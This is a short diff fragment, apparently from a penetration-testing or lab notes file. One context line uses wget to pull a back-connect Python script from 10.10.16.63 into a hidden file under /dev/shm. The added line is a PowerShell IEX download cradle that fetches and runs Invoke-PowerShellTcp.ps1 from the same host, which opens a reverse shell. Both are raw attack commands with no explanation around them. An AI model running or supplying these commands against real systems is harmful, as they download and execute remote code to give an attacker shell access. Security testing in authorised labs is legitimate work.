@@ -19,4 +19,4 @@ cmd=wget 10.10.16.63:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.pyca
 
 
 
-
+C:\Windows\SysNative\WindowsPowerShell\v1.0\PowerShell.exe  IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.63:8000/Invoke-PowerShellTcp.ps1')
